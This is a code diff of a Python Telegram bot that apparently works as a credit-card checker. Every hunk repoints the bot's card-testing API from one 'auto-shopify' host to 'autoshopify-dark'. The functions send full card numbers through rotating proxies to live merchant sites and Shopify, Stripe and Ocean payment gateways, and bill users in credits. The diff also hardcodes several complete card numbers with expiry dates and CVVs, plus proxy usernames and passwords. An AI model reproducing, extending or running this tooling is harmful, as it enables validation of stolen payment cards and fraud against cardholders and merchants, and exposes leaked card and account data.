@@ -2626,7 +2626,7 @@ async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYP
     # --- Test the site via API using a dummy card ---
     test_card = "4242424242424242|12|2025|123"
     api_url = (
-        f"https://auto-shopify-6cz4.onrender.com/index.php"
+        f"https://autoshopify-dark.sevalla.app/index.php"
         f"?site={new_site}"
         f"&cc={test_card}"
         f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
@@ -2704,7 +2704,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"https://autoshopify-dark.sevalla.app/index.php"
             f"?site={CURRENT_SHOPIFY_SITE}"
             f"&cc={full_card}"
             f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
@@ -2947,7 +2947,7 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"https://autoshopify-dark.sevalla.app/index.php"
             f"?site=https://shop.outsideonline.com"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -3183,7 +3183,7 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
 
         # --- API request ---
         api_url = (
-            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"https://autoshopify-dark.sevalla.app/index.php"
             f"?site=https://vasileandpavel.com"
             f"&cc={full_card}"
             f"&gateway=stripe"
@@ -3420,7 +3420,7 @@ async def process_oc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"https://autoshopify-dark.sevalla.app/index.php"
             f"?site=https://arabellahair.com"
             f"&cc={full_card}"
             f"&gateway=ocean"
@@ -3702,7 +3702,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"https://autoshopify-dark.sevalla.app/index.php"
             f"?site=https://unikeyhealth.com"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -3896,7 +3896,7 @@ async def process_seturl(user, user_id, site_input, processing_msg):
     """Background worker that does the API call + DB update"""
 
     api_url = (
-        "https://auto-shopify-6cz4.onrender.com/index.php"
+        "https://autoshopify-dark.sevalla.app/index.php"
         f"?site={site_input}"
         "&cc=4312311807552605|08|2031|631"
         "&proxy=qhlpirsk-5325:96zjmb7awmom@p.webshare.io:80"
@@ -4060,7 +4060,7 @@ async def consume_credit(user_id: int) -> bool:
 
 # ===== API template =====
 API_CHECK_TEMPLATE = (
-    "https://auto-shopify-6cz4.onrender.com/index.php"
+    "https://autoshopify-dark.sevalla.app/index.php"
     "?site={site}"
     "&cc={card}"
     "&proxy=qhlpirsk-5338:96zjmb7awmom@p.webshare.io:80"
@@ -4311,7 +4311,7 @@ from db import get_user, update_user   # DB functions
 last_site_usage = {}
 
 API_TEMPLATE = (
-    "https://auto-shopify-6cz4.onrender.com/index.php"
+    "https://autoshopify-dark.sevalla.app/index.php"
     "?site={site_url}&cc=4312311807552605|08|2031|631"
 )
 
@@ -4455,7 +4455,7 @@ from telegram.error import TelegramError
 from db import get_user, update_user
 
 API_TEMPLATE = (
-    "https://auto-shopify-6cz4.onrender.com/index.php"
+    "https://autoshopify-dark.sevalla.app/index.php"
     "?site={site_url}&cc=5547300001996183|11|2028|197"
 )
 
@@ -4898,7 +4898,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await consume_credit(user_id):
         return await update.message.reply_text("❌ You have no credits left.")
 
-    base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
+    base_url = user_data.get("base_url", "https://autoshopify-dark.sevalla.app/index.php")
     sites = user_data.get("custom_urls", [])
     if not sites:
         return await update.message.reply_text("❌ No sites found in your account.")
